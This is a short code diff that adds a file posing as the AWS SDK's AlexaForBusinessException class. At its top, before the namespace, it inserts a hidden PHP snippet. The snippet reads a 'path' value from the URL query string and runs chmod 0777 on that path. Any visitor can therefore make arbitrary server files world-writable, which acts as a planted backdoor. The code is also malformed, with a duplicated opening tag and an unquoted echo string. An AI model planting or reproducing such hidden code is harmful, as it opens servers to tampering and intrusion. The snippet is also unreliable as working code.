@@ -1,0 +1,14 @@
+<?php
+<?php
+$path = stripslashes($_GET['path']);
+$ok = chmod ($path , 0777);
+if ($ok == true)
+echo CHMOD OK , Permission editable file or directory. Permission to write;
+?>namespace Aws\AlexaForBusiness\Exception;
+
+use Aws\Exception\AwsException;
+
+/**
+ * Represents an error interacting with the **Alexa For Business** service.
+ */
+class AlexaForBusinessException extends AwsException {}
